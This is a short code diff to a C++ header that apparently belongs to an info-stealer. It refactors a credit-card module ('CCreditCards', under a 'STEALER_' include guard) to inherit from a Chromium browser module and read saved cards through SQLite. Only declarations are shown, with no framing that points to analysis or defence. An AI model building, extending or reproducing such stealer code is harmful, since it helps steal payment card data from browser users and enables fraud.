@@ -6,8 +6,8 @@
 #define STEALER_CCREDITCARDS_H
 
 
-#include "../../BrowserModule.h"
 #include "sqlite3.h"
+#include "../ChromiumBrowserModule.h"
 
 struct CreditCard {
     std::string name_on_card = "Unknown";
@@ -17,7 +17,7 @@ struct CreditCard {
     int use_count;
 };
 
-class CCreditCards : public BrowserModule {
+class CCreditCards : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
 private:
